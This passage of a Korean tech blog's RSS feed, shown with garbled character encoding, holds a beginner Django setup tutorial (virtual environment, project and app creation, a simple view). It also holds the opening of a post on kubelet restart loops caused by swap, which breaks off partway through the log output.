ì„¤ì¹˜ í™•ì¸ âœ…"></a>Step 1: Python ì„¤ì¹˜ í™•ì¸ âœ…</h3><p>í„°ë¯¸ë„(ë˜ëŠ” ëª…ë ¹ í”„ë¡¬í”„íŠ¸)ì„ ì—´ê³  ë‹¤ìŒ ëª…ë ¹ì–´ë¡œ Pythonì´ ì„¤ì¹˜ë˜ì–´ ìˆëŠ”ì§€ í™•ì¸í•´ë³´ì„¸ìš”:</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python --version</span><br><span class="line"><span class="comment"># ë˜ëŠ”</span></span><br><span class="line">python3 --version</span><br></pre></td></tr></table></figure><p>Python ë²„ì „ì´ í‘œì‹œë˜ë©´ ì •ìƒì ìœ¼ë¡œ ì„¤ì¹˜ëœ ê²ƒì…ë‹ˆë‹¤! ğŸ‰</p><h3 id="Step-2-ê°€ìƒí™˜ê²½-ìƒì„±í•˜ê¸°-ğŸ "><a href="#Step-2-ê°€ìƒí™˜ê²½-ìƒì„±í•˜ê¸°-ğŸ " class="headerlink" title="Step 2: ê°€ìƒí™˜ê²½ ìƒì„±í•˜ê¸° ğŸ "></a>Step 2: ê°€ìƒí™˜ê²½ ìƒì„±í•˜ê¸° ğŸ </h3><p>ê°€ìƒí™˜ê²½ì„ ì‚¬ìš©í•˜ë©´ í”„ë¡œì íŠ¸ë§ˆë‹¤ ë…ë¦½ì ì¸ Python í™˜ê²½ì„ êµ¬ì„±í•  ìˆ˜ ìˆì–´ìš”. ì´ë ‡ê²Œ í•˜ë©´ í”„ë¡œì íŠ¸ ê°„ íŒ¨í‚¤ì§€ ì¶©ëŒì„ ë°©ì§€í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤!</p><p><strong>ê°€ìƒí™˜ê²½ ìƒì„±:</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Windows</span></span><br><span class="line">python -m venv myenv</span><br><span class="line"></span><br><span class="line"><span class="comment"># macOS/Linux</span></span><br><span class="line">python3 -m venv myenv</span><br></pre></td></tr></table></figure><p>ì—¬ê¸°ì„œ <code>myenv</code>ëŠ” ê°€ìƒí™˜ê²½ì˜ ì´ë¦„ì´ì—ìš”. ì›í•˜ëŠ” ì´ë¦„ìœ¼ë¡œ ë³€ê²½í•´ë„ ë©ë‹ˆë‹¤! ğŸ˜Š</p><p><strong>ê°€ìƒí™˜ê²½ í™œì„±í™”:</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Windows</span></span><br><span class="line">myenv\Scripts\activate</span><br><span class="line"></span><br><span class="line"><span class="comment"># macOS/Linux</span></span><br><span class="line"><span class="built_in">source</span> myenv/bin/activate</span><br></pre></td></tr></table></figure><p>ê°€ìƒí™˜ê²½ì´ í™œì„±í™”ë˜ë©´ í„°ë¯¸ë„ í”„ë¡¬í”„íŠ¸ ì•ì— <code>(myenv)</code>ê°€ í‘œì‹œë©ë‹ˆë‹¤! âœ¨</p><h3 id="Step-3-Django-ì„¤ì¹˜-ğŸ"><a href="#Step-3-Django-ì„¤ì¹˜-ğŸ" class="headerlink" title="Step 3: Django ì„¤ì¹˜ ğŸ"></a>Step 3: Django ì„¤ì¹˜ ğŸ</h3><p>ì´ì œ pipë¥¼ ì‚¬ìš©í•˜ì—¬ Djangoë¥¼ ì„¤ì¹˜í•´ë³¼ê¹Œìš”?</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pip install django</span><br></pre></td></tr></table></figure><p>ìµœì‹  ë²„ì „ì˜ Djangoê°€ ìë™ìœ¼ë¡œ ì„¤ì¹˜ë©ë‹ˆë‹¤! ğŸš€</p><p><strong>íŠ¹ì • ë²„ì „ ì„¤ì¹˜í•˜ê¸°:</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># íŠ¹ì • ë²„ì „ ì„¤ì¹˜</span></span><br><span class="line">pip install django==4.2</span><br><span class="line"></span><br><span class="line"><span class="comment"># ìµœì‹  LTS ë²„ì „ ì„¤ì¹˜ (ê¶Œì¥)</span></span><br><span class="line">pip install django==4.2.7</span><br></pre></td></tr></table></figure><h3 id="Step-4-ì„¤ì¹˜-í™•ì¸-ğŸ”"><a href="#Step-4-ì„¤ì¹˜-í™•ì¸-ğŸ”" class="headerlink" title="Step 4: ì„¤ì¹˜ í™•ì¸ ğŸ”"></a>Step 4: ì„¤ì¹˜ í™•ì¸ ğŸ”</h3><p>Djangoê°€ ì œëŒ€ë¡œ ì„¤ì¹˜ë˜ì—ˆëŠ”ì§€ í™•ì¸í•´ë´…ì‹œë‹¤:</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">django-admin --version</span><br></pre></td></tr></table></figure><p>ë²„ì „ ë²ˆí˜¸ê°€ í‘œì‹œë˜ë©´ ì„±ê³µì ìœ¼ë¡œ ì„¤ì¹˜ëœ ê²ƒì…ë‹ˆë‹¤! ğŸŠ</p><h3 id="ì¶”ê°€-íŒ¨í‚¤ì§€-ì„¤ì¹˜-ì„ íƒì‚¬í•­-ğŸ“š"><a href="#ì¶”ê°€-íŒ¨í‚¤ì§€-ì„¤ì¹˜-ì„ íƒì‚¬í•­-ğŸ“š" class="headerlink" title="ì¶”ê°€ íŒ¨í‚¤ì§€ ì„¤ì¹˜ (ì„ íƒì‚¬í•­) ğŸ“š"></a>ì¶”ê°€ íŒ¨í‚¤ì§€ ì„¤ì¹˜ (ì„ íƒì‚¬í•­) ğŸ“š</h3><p>Django ê°œë°œì„ ë” í¸í•˜ê²Œ í•˜ê¸° ìœ„í•œ ì¶”ê°€ íŒ¨í‚¤ì§€ë“¤ë„ ì„¤ì¹˜í•  ìˆ˜ ìˆì–´ìš”:</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># ê°œë°œ ì„œë²„ ìë™ ì¬ì‹œì‘ (ì´ë¯¸ Djangoì— í¬í•¨ë¨)</span></span><br><span class="line">pip install django</span><br><span class="line"></span><br><span class="line"><span class="comment"># PostgreSQL ì‚¬ìš© ì‹œ</span></span><br><span class="line">pip install psycopg2-binary</span><br><span class="line"></span><br><span class="line"><span class="comment"># MySQL ì‚¬ìš© ì‹œ</span></span><br><span class="line">pip install mysqlclient</span><br><span class="line"></span><br><span class="line"><span class="comment"># í™˜ê²½ë³€ìˆ˜ ê´€ë¦¬</span></span><br><span class="line">pip install python-decouple</span><br><span class="line"></span><br><span class="line"><span class="comment"># REST API ê°œë°œ ì‹œ</span></span><br><span class="line">pip install djangorestframework</span><br><span class="line"></span><br><span class="line"><span class="comment"># CORS ì²˜ë¦¬</span></span><br><span class="line">pip install django-cors-headers</span><br></pre></td></tr></table></figure><p>í•„ìš”í•œ íŒ¨í‚¤ì§€ë§Œ ì„ íƒí•´ì„œ ì„¤ì¹˜í•˜ì‹œë©´ ë©ë‹ˆë‹¤! ğŸ˜‰</p><h2 id="3ï¸âƒ£-Django-í”„ë¡œì íŠ¸-ìƒì„±í•˜ê¸°-ğŸ—ï¸"><a href="#3ï¸âƒ£-Django-í”„ë¡œì íŠ¸-ìƒì„±í•˜ê¸°-ğŸ—ï¸" class="headerlink" title="3ï¸âƒ£ Django í”„ë¡œì íŠ¸ ìƒì„±í•˜ê¸° ğŸ—ï¸"></a>3ï¸âƒ£ Django í”„ë¡œì íŠ¸ ìƒì„±í•˜ê¸° ğŸ—ï¸</h2><p>ì, ì´ì œ ë³¸ê²©ì ìœ¼ë¡œ Django í”„ë¡œì íŠ¸ë¥¼ ë§Œë“¤ì–´ë³¼ ì‹œê°„ì…ë‹ˆë‹¤! ë‘ê·¼ë‘ê·¼! ğŸ’“</p><h3 id="Step-1-í”„ë¡œì íŠ¸-ìƒì„±-ğŸ¬"><a href="#Step-1-í”„ë¡œì íŠ¸-ìƒì„±-ğŸ¬" class="headerlink" title="Step 1: í”„ë¡œì íŠ¸ ìƒì„± ğŸ¬"></a>Step 1: í”„ë¡œì íŠ¸ ìƒì„± ğŸ¬</h3><p>ì›í•˜ëŠ” ë””ë ‰í† ë¦¬ë¡œ ì´ë™í•œ í›„, ë‹¤ìŒ ëª…ë ¹ì–´ë¡œ ìƒˆ í”„ë¡œì íŠ¸ë¥¼ ìƒì„±í•©ë‹ˆë‹¤:</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">django-admin startproject myproject</span><br></pre></td></tr></table></figure><p><code>myproject</code>ëŠ” í”„ë¡œì íŠ¸ ì´ë¦„ì´ì—ìš”. ì›í•˜ëŠ” ì´ë¦„ìœ¼ë¡œ ë³€ê²½ ê°€ëŠ¥í•©ë‹ˆë‹¤! (ì˜ˆ: blog, ecommerce, portfolio ë“±)</p><p>ì´ ëª…ë ¹ì–´ë¥¼ ì‹¤í–‰í•˜ë©´ ë‹¤ìŒê³¼ ê°™ì€ êµ¬ì¡°ì˜ í”„ë¡œì íŠ¸ê°€ ìƒì„±ë©ë‹ˆë‹¤:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">myproject/</span><br><span class="line">    manage.py</span><br><span class="line">    myproject/</span><br><span class="line">        __init__.py</span><br><span class="line">        settings.py</span><br><span class="line">        urls.py</span><br><span class="line">        asgi.py</span><br><span class="line">        wsgi.py</span><br></pre></td></tr></table></figure><p><strong>ê° íŒŒì¼ì˜ ì—­í• :</strong> ğŸ“‹</p><ul><li><code>manage.py</code>: Django í”„ë¡œì íŠ¸ë¥¼ ê´€ë¦¬í•˜ëŠ” ì»¤ë§¨ë“œë¼ì¸ ìœ í‹¸ë¦¬í‹° ğŸ› ï¸</li><li><code>settings.py</code>: í”„ë¡œì íŠ¸ì˜ ëª¨ë“  ì„¤ì •ì´ ë‹´ê¸´ íŒŒì¼ âš™ï¸</li><li><code>urls.py</code>: URL ë¼ìš°íŒ…ì„ ê´€ë¦¬í•˜ëŠ” íŒŒì¼ ğŸ—ºï¸</li><li><code>wsgi.py</code>: í”„ë¡œë•ì…˜ ì„œë²„ ë°°í¬ ì‹œ ì‚¬ìš© ğŸš€</li><li><code>asgi.py</code>: ë¹„ë™ê¸° ì„œë²„ ë°°í¬ ì‹œ ì‚¬ìš© âš¡</li></ul><h3 id="Step-2-í”„ë¡œì íŠ¸-ë””ë ‰í† ë¦¬ë¡œ-ì´ë™-ğŸš¶â€â™‚ï¸"><a href="#Step-2-í”„ë¡œì íŠ¸-ë””ë ‰í† ë¦¬ë¡œ-ì´ë™-ğŸš¶â€â™‚ï¸" class="headerlink" title="Step 2: í”„ë¡œì íŠ¸ ë””ë ‰í† ë¦¬ë¡œ ì´ë™ ğŸš¶â€â™‚ï¸"></a>Step 2: í”„ë¡œì íŠ¸ ë””ë ‰í† ë¦¬ë¡œ ì´ë™ ğŸš¶â€â™‚ï¸</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> myproject</span><br></pre></td></tr></table></figure><h3 id="Step-3-ë°ì´í„°ë² ì´ìŠ¤-ë§ˆì´ê·¸ë ˆì´ì…˜-ğŸ—„ï¸"><a href="#Step-3-ë°ì´í„°ë² ì´ìŠ¤-ë§ˆì´ê·¸ë ˆì´ì…˜-ğŸ—„ï¸" class="headerlink" title="Step 3: ë°ì´í„°ë² ì´ìŠ¤ ë§ˆì´ê·¸ë ˆì´ì…˜ ğŸ—„ï¸"></a>Step 3: ë°ì´í„°ë² ì´ìŠ¤ ë§ˆì´ê·¸ë ˆì´ì…˜ ğŸ—„ï¸</h3><p>DjangoëŠ” ê¸°ë³¸ì ìœ¼ë¡œ SQLite ë°ì´í„°ë² ì´ìŠ¤ë¥¼ ì‚¬ìš©í•©ë‹ˆë‹¤. ì´ˆê¸° ë°ì´í„°ë² ì´ìŠ¤ í…Œì´ë¸”ì„ ìƒì„±í•´ë´…ì‹œë‹¤:</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python manage.py migrate</span><br></pre></td></tr></table></figure><p>ì—¬ëŸ¬ ì¤„ì˜ ë©”ì‹œì§€ê°€ ë‚˜íƒ€ë‚˜ë©´ì„œ ë°ì´í„°ë² ì´ìŠ¤ í…Œì´ë¸”ë“¤ì´ ìƒì„±ë©ë‹ˆë‹¤! âœ…</p><h3 id="Step-4-ê°œë°œ-ì„œë²„-ì‹¤í–‰-ğŸ®"><a href="#Step-4-ê°œë°œ-ì„œë²„-ì‹¤í–‰-ğŸ®" class="headerlink" title="Step 4: ê°œë°œ ì„œë²„ ì‹¤í–‰ ğŸ®"></a>Step 4: ê°œë°œ ì„œë²„ ì‹¤í–‰ ğŸ®</h3><p>ë“œë””ì–´ Django ì„œë²„ë¥¼ ì‹¤í–‰í•  ì‹œê°„ì…ë‹ˆë‹¤!</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python manage.py runserver</span><br></pre></td></tr></table></figure><p>í„°ë¯¸ë„ì— ë‹¤ìŒê³¼ ê°™ì€ ë©”ì‹œì§€ê°€ í‘œì‹œë©ë‹ˆë‹¤:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Starting development server at http://127.0.0.1:8000/</span><br><span class="line">Quit the server with CONTROL-C.</span><br></pre></td></tr></table></figure><p>ì´ì œ ë¸Œë¼ìš°ì €ë¥¼ ì—´ê³  <code>http://127.0.0.1:8000/</code> ë˜ëŠ” <code>http://localhost:8000/</code>ì— ì ‘ì†í•´ë³´ì„¸ìš”! ğŸŒ</p><p>Djangoì˜ í™˜ì˜ í˜ì´ì§€(ë¡œì¼“ ê·¸ë¦¼ ğŸš€)ê°€ ë³´ì´ë©´ ì„±ê³µì…ë‹ˆë‹¤! ì¶•í•˜í•©ë‹ˆë‹¤! ğŸ‰ğŸŠ</p><p><strong>ë‹¤ë¥¸ í¬íŠ¸ë¡œ ì‹¤í–‰í•˜ê¸°:</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python manage.py runserver 8080</span><br></pre></td></tr></table></figure><h3 id="Step-5-ê´€ë¦¬ì-ê³„ì •-ìƒì„±-ğŸ‘¤"><a href="#Step-5-ê´€ë¦¬ì-ê³„ì •-ìƒì„±-ğŸ‘¤" class="headerlink" title="Step 5: ê´€ë¦¬ì ê³„ì • ìƒì„± ğŸ‘¤"></a>Step 5: ê´€ë¦¬ì ê³„ì • ìƒì„± ğŸ‘¤</h3><p>Djangoì˜ ê°•ë ¥í•œ ê¸°ëŠ¥ ì¤‘ í•˜ë‚˜ì¸ ê´€ë¦¬ì í˜ì´ì§€ë¥¼ ì‚¬ìš©í•˜ê¸° ìœ„í•´ ìŠˆí¼ìœ ì €ë¥¼ ìƒì„±í•´ë´…ì‹œë‹¤:</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python manage.py createsuperuser</span><br></pre></td></tr></table></figure><p>ì‚¬ìš©ì ì´ë¦„, ì´ë©”ì¼, ë¹„ë°€ë²ˆí˜¸ë¥¼ ì…ë ¥í•˜ë¼ëŠ” ë©”ì‹œì§€ê°€ ë‚˜íƒ€ë‚©ë‹ˆë‹¤. ì°¨ë¡€ëŒ€ë¡œ ì…ë ¥í•´ì£¼ì„¸ìš”! ğŸ“</p><p>ìƒì„± í›„ ì„œë²„ë¥¼ ì‹¤í–‰í•˜ê³  <code>http://127.0.0.1:8000/admin/</code>ì— ì ‘ì†í•˜ë©´ ë¡œê·¸ì¸ í˜ì´ì§€ë¥¼ ë³¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤! ğŸ”</p><h3 id="Step-6-ì•±-App-ìƒì„±í•˜ê¸°-ğŸ“±"><a href="#Step-6-ì•±-App-ìƒì„±í•˜ê¸°-ğŸ“±" class="headerlink" title="Step 6: ì•±(App) ìƒì„±í•˜ê¸° ğŸ“±"></a>Step 6: ì•±(App) ìƒì„±í•˜ê¸° ğŸ“±</h3><p>Djangoì—ì„œëŠ” ê¸°ëŠ¥ë³„ë¡œ â€˜ì•±â€™ì„ ë§Œë“¤ì–´ ê´€ë¦¬í•©ë‹ˆë‹¤. ì˜ˆë¥¼ ë“¤ì–´, ë¸”ë¡œê·¸ í”„ë¡œì íŠ¸ë¼ë©´ â€˜postsâ€™, â€˜commentsâ€™, â€˜usersâ€™ ê°™ì€ ì•±ë“¤ë¡œ êµ¬ì„±í•  ìˆ˜ ìˆì–´ìš”!</p><p>ìƒˆ ì•±ì„ ìƒì„±í•´ë´…ì‹œë‹¤:</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python manage.py startapp myapp</span><br></pre></td></tr></table></figure><p><code>myapp</code>ì´ë¼ëŠ” ì´ë¦„ì˜ ìƒˆë¡œìš´ ì•±ì´ ìƒì„±ë©ë‹ˆë‹¤! ë‹¤ìŒê³¼ ê°™ì€ êµ¬ì¡°ê°€ ë§Œë“¤ì–´ì ¸ìš”:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">myapp/</span><br><span class="line">    __init__.py</span><br><span class="line">    admin.py</span><br><span class="line">    apps.py</span><br><span class="line">    models.py</span><br><span class="line">    tests.py</span><br><span class="line">    views.py</span><br><span class="line">    migrations/</span><br><span class="line">        __init__.py</span><br></pre></td></tr></table></figure><p><strong>ê° íŒŒì¼ì˜ ì—­í• :</strong> ğŸ“‹</p><ul><li><code>models.py</code>: ë°ì´í„° ëª¨ë¸ ì •ì˜ ğŸ—ƒï¸</li><li><code>views.py</code>: ë·° í•¨ìˆ˜&#x2F;í´ë˜ìŠ¤ ì •ì˜ ğŸ¯</li><li><code>admin.py</code>: ê´€ë¦¬ì í˜ì´ì§€ ì„¤ì • ğŸ‘¨â€ğŸ’¼</li><li><code>tests.py</code>: í…ŒìŠ¤íŠ¸ ì½”ë“œ ì‘ì„± ğŸ§ª</li><li><code>migrations/</code>: ë°ì´í„°ë² ì´ìŠ¤ ë§ˆì´ê·¸ë ˆì´ì…˜ íŒŒì¼ ì €ì¥ ğŸ“¦</li></ul><h3 id="Step-7-ì•±-ë“±ë¡í•˜ê¸°-ğŸ“Œ"><a href="#Step-7-ì•±-ë“±ë¡í•˜ê¸°-ğŸ“Œ" class="headerlink" title="Step 7: ì•± ë“±ë¡í•˜ê¸° ğŸ“Œ"></a>Step 7: ì•± ë“±ë¡í•˜ê¸° ğŸ“Œ</h3><p>ìƒì„±í•œ ì•±ì„ í”„ë¡œì íŠ¸ì— ë“±ë¡í•´ì•¼ Djangoê°€ ì¸ì‹í•  ìˆ˜ ìˆì–´ìš”!</p><p><code>myproject/settings.py</code> íŒŒì¼ì„ ì—´ê³  <code>INSTALLED_APPS</code> ë¦¬ìŠ¤íŠ¸ì— ì•±ì„ ì¶”ê°€í•©ë‹ˆë‹¤:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">INSTALLED_APPS = [</span><br><span class="line">    <span class="string">&#x27;django.contrib.admin&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;django.contrib.auth&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;django.contrib.contenttypes&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;django.contrib.sessions&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;django.contrib.messages&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;django.contrib.staticfiles&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;myapp&#x27;</span>,  <span class="comment"># ğŸ†• ìƒˆë¡œ ì¶”ê°€!</span></span><br><span class="line">]</span><br></pre></td></tr></table></figure><h3 id="ê°„ë‹¨í•œ-View-ë§Œë“¤ì–´ë³´ê¸°-ğŸ¨"><a href="#ê°„ë‹¨í•œ-View-ë§Œë“¤ì–´ë³´ê¸°-ğŸ¨" class="headerlink" title="ê°„ë‹¨í•œ View ë§Œë“¤ì–´ë³´ê¸° ğŸ¨"></a>ê°„ë‹¨í•œ View ë§Œë“¤ì–´ë³´ê¸° ğŸ¨</h3><p><code>myapp/views.py</code> íŒŒì¼ì„ ì—´ê³  ë‹¤ìŒ ì½”ë“œë¥¼ ì‘ì„±í•´ë´…ì‹œë‹¤:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> django.http <span class="keyword">import</span> HttpResponse</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hello</span>(<span class="params">request</span>):</span><br><span class="line">    <span class="keyword">return</span> HttpResponse(<span class="string">&quot;ì•ˆë…•í•˜ì„¸ìš”! Django ì„¸ê³„ì— ì˜¤ì‹  ê²ƒì„ í™˜ì˜í•©ë‹ˆë‹¤! ğŸ‰&quot;</span>)</span><br></pre></td></tr></table></figure><p><code>myapp/urls.py</code> íŒŒì¼ì„ ìƒˆë¡œ ìƒì„±í•˜ê³ :</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> django.urls <span class="keyword">import</span> path</span><br><span class="line"><span class="keyword">from</span> . <span class="keyword">import</span> views</span><br><span class="line"></span><br><span class="line">urlpatterns = [</span><br><span class="line">    path(<span class="string">&#x27;&#x27;</span>, views.hello, name=<span class="string">&#x27;hello&#x27;</span>),</span><br><span class="line">]</span><br></pre></td></tr></table></figure><p>ë©”ì¸ <code>myproject/urls.py</code> íŒŒì¼ì— ì•±ì˜ URLì„ ì—°ê²°í•©ë‹ˆë‹¤:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> django.contrib <span class="keyword">import</span> admin</span><br><span class="line"><span class="keyword">from</span> django.urls <span class="keyword">import</span> path, include</span><br><span class="line"></span><br><span class="line">urlpatterns = [</span><br><span class="line">    path(<span class="string">&#x27;admin/&#x27;</span>, admin.site.urls),</span><br><span class="line">    path(<span class="string">&#x27;hello/&#x27;</span>, include(<span class="string">&#x27;myapp.urls&#x27;</span>)),  <span class="comment"># ğŸ†• ìƒˆë¡œ ì¶”ê°€!</span></span><br><span class="line">]</span><br></pre></td></tr></table></figure><p>ì„œë²„ë¥¼ ì‹¤í–‰í•˜ê³  <code>http://127.0.0.1:8000/hello/</code>ì— ì ‘ì†í•˜ë©´ í™˜ì˜ ë©”ì‹œì§€ë¥¼ ë³¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤! ğŸŠ</p><h2 id="ë§ˆì¹˜ë©°-ğŸ“"><a href="#ë§ˆì¹˜ë©°-ğŸ“" class="headerlink" title="ë§ˆì¹˜ë©° ğŸ“"></a>ë§ˆì¹˜ë©° ğŸ“</h2><p>ì¶•í•˜í•©ë‹ˆë‹¤! ğŸ‰ ì—¬ëŸ¬ë¶„ì€ ì´ì œ Djangoì˜ ê¸°ë³¸ì„ ëª¨ë‘ ë§ˆìŠ¤í„°í–ˆì–´ìš”!</p><p>ì˜¤ëŠ˜ ë°°ìš´ ë‚´ìš©ì„ ì •ë¦¬í•˜ë©´:</p><ul><li>âœ… Djangoê°€ ë¬´ì—‡ì¸ì§€, ì™œ ì‚¬ìš©í•˜ëŠ”ì§€ ì´í•´í–ˆì–´ìš”</li><li>âœ… Djangoë¥¼ ì„¤ì¹˜í•˜ê³  ê°€ìƒí™˜ê²½ì„ êµ¬ì„±í–ˆì–´ìš”</li><li>âœ… ìƒˆë¡œìš´ í”„ë¡œì íŠ¸ì™€ ì•±ì„ ìƒì„±í–ˆì–´ìš”</li><li>âœ… ê°„ë‹¨í•œ ë·°ë¥¼ ë§Œë“¤ì–´ ì‹¤í–‰í•´ë´¤ì–´ìš”</li></ul><p>ì´ì œ ì—¬ëŸ¬ë¶„ì€ Djangoë¡œ ë©‹ì§„ ì›¹ ì• í”Œë¦¬ì¼€ì´ì…˜ì„ ë§Œë“¤ ì¤€ë¹„ê°€ ë˜ì—ˆìŠµë‹ˆë‹¤! ğŸ’ª</p><p>DjangoëŠ” ì •ë§ ê°•ë ¥í•˜ê³  ìœ ìš©í•œ í”„ë ˆì„ì›Œí¬ì˜ˆìš”. ê³µì‹ ë¬¸ì„œ(<a href="https://docs.djangoproject.com/">https://docs.djangoproject.com</a>)ë¥¼ ì°¸ê³ í•˜ë©´ì„œ ë” ë§ì€ ê¸°ëŠ¥ë“¤ì„ íƒí—˜í•´ë³´ì„¸ìš”! ğŸ“š</p><p>ë‹¤ìŒ í¬ìŠ¤íŒ…ì—ì„œëŠ” Django ëª¨ë¸ê³¼ ë°ì´í„°ë² ì´ìŠ¤ ì—°ë™ì— ëŒ€í•´ ì•Œì•„ë³´ê² ìŠµë‹ˆë‹¤! ê¸°ëŒ€í•´ì£¼ì„¸ìš”! ğŸ˜Š</p><p>Happy Coding! ğŸ’»âœ¨</p>]]></content:encoded>
      
      
      <category domain="https://ckck803.github.io/categories/Django/">Django</category>
      
      <category domain="https://ckck803.github.io/categories/Django/Python/">Python</category>
      
      
      <category domain="https://ckck803.github.io/tags/Django/">Django</category>
      
      <category domain="https://ckck803.github.io/tags/Python/">Python</category>
      
      <category domain="https://ckck803.github.io/tags/Web-Framework/">Web Framework</category>
      
      <category domain="https://ckck803.github.io/tags/Backend/">Backend</category>
      
      
      <comments>https://ckck803.github.io/2025/11/27/django/django-start/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>Kubernetes Node ì¬ì‹¤í–‰ í›„ swap ìœ¼ë¡œ ì¸í•œ kubelet ë¬´í•œ ì¬ì‹œì‘</title>
      <link>https://ckck803.github.io/2025/11/27/k8s/kubernetes-swap/</link>
      <guid>https://ckck803.github.io/2025/11/27/k8s/kubernetes-swap/</guid>
      <pubDate>Wed, 26 Nov 2025 15:00:00 GMT</pubDate>
      
      <description>&lt;p&gt;&lt;img src=&quot;/images/k8s/k8s.png&quot;&gt;&lt;/p&gt;
&lt;p&gt;ìµœê·¼ í™ˆ ì„œë²„ì— Kubernetes í´ëŸ¬ìŠ¤í„°ë¥¼ êµ¬ì„±í•˜ë˜ ì¤‘, ë…¸ë“œê°€ ì¬ì‹¤í–‰í•œ í›„ì— ë…¸ë“œê°€ NotReady ìƒíƒœë¡œ ë–¨ì–´ì§€ë©° kubelet ì´ ê³„ì† ì¬ì‹œì‘ë˜ëŠ” ë¬¸ì œë¥¼ ê²ªì—ˆë‹¤.&lt;br&gt;systemd ë¡œê·¸ë¥¼ í™•ì¸í•´ ë³´ë‹ˆ, kubelet ì´ ë¬´í•œ ì¬ì‹œì‘ë˜ë©° restart counter ê°€ 6500íšŒë¥¼ ë„˜ëŠ” ì‹¬ê°í•œ ìƒíƒœì˜€ë‹¤.&lt;/p&gt;
&lt;h2 id=&quot;ğŸ”-ë¬¸ì œ-ìƒí™©&quot;&gt;&lt;a href=&quot;#ğŸ”-ë¬¸ì œ-ìƒí™©&quot; class=&quot;headerlink&quot; title=&quot;ğŸ” ë¬¸ì œ ìƒí™©&quot;&gt;&lt;/a&gt;ğŸ” ë¬¸ì œ ìƒí™©&lt;/h2&gt;&lt;p&gt;ê³„ì† ì¬ì‹œì‘ ë˜ëŠ” ë…¸ë“œë¡œ ë“¤ì–´ê°€ì„œ kubelet ì„œë¹„ìŠ¤ ìƒíƒœë¥¼ í™•ì¸í•˜ë©´ ë‹¤ìŒê³¼ ê°™ì€ ë©”ì‹œì§€ê°€ ë°˜ë³µì ìœ¼ë¡œ ì¶œë ¥ëœë‹¤.&lt;/p&gt;
&lt;figure class=&quot;highlight plaintext&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&amp;gt; sudo systemctl status kubelet&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;â— kubelet.service - kubelet: The Kubernetes Node Agent&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;     Loaded: loaded (/usr/lib/systemd/system/kubelet.service; enabled; preset: enabled)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    Drop-In: /usr/lib/systemd/system/kubelet.service.d&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;             â””â”€10-kubeadm.conf&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;     Active: activating (auto-restart) (Result: exit-code) since Sun 2025-11-23 10:52:13 KST; 1s ago&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;       Docs: https://kubernetes.io/docs/&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    Process: 150004 ExecStart=/usr/bin/kubelet $KUBELET_KUBECONFIG_ARGS $KUBELET_CONFIG_ARGS $KUBELET_KUBEADM_ARGS $KUBELET_EXTRA_ARGS (code=exited, status=1/FAILURE)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;   Main PID: 150004 (code=exited, status=1/FAILURE)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        CPU: 90ms&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;gt; sudo journalctl -u kubelet -n 50 --no-pager&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;Nov 23 10:52:54 systemd[1]: kubelet.service: Main process exited, code=exited, status=1/FAILURE &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;Nov 23 10:52:54 systemd[1]: kubelet.service: Failed with result &amp;#x27;exit-code&amp;#x27;. &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;Nov 23 10:53:04 systemd[1]: kubelet.service: Scheduled restart job, restart counter is at 6578. &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;Nov 23 10:53:04 systemd[1]: Started kubelet.service - kubelet: The Kubernetes Node Agent. &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;Nov 23 10:53:04 kubelet[150116]: Flag --container-runtime-endpoint has been deprecated, This parameter should be set via the config file specified by the Kubelet&amp;#x27;s --config flag. See 